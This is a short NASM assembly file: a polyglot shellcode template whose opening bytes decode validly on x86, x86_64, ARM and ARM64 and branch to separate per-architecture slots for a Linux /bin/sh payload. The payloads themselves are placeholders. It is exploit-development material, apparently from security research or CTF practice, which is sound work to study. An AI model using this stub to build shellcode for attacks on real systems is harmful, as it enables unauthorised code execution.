; 2016 - ixty
; multi-arch linux /bin/sh shellcode
; works on:
;   x86
;   x86_64
;   arm
;   arm_64
; tested on debian jessie

; compile with nasm
bits 32
_start:

; ======================================================================= ;
; init, polyglot shellcode for arm, arm64, x86, x86_64
; branches out to specific arch dependent payloads
; ======================================================================= ;

; arm       andlo   r0, r0, #0xeb000
; arm64     orr     w11, w23, #7
; x86       jmp     $+0xa / junk
; x86_64    jmp     $+0xa / junk
    db 0xeb, (_x86 - $ - 2), 0x00, 0x32
; arm       b       _arm ($+0x10)
; arm64     ands    x1, x0, x0
    db ((_arm - $ - 8) / 4) % 0x100, ((_arm - $ - 8) / 4) / 0x100, 0x00, 0xea
; arm64     b       _arm64 ($+0x14)
    db ((_arm64 - $) / 4) % 0x100, ((_arm64 - $) / 4) / 0x100, 0x00, 0x14


; ======================================================================= ;
; x86 only, detect 32/64 bits
; ======================================================================= ;
_x86:
; x86       xor eax, eax;
; x86_64    xor eax, eax;
    xor eax, eax
; x86       inc eax
; x86_64    REX + nop
    db 0x40
    nop
    jz _x86_64


; ======================================================================= ;
; PAYLOADs
; ======================================================================= ;
_x86_32:
    __payload_x86__

_x86_64:
    __payload_x86_64__
    times (4 - (($ - _start) % 4)) nop      ; must be 4b aligned
_arm:
    __payload_arm__
    times (4 - (($ - _start) % 4)) nop      ; must be 4b aligned
_arm64:
    __payload_arm_64__
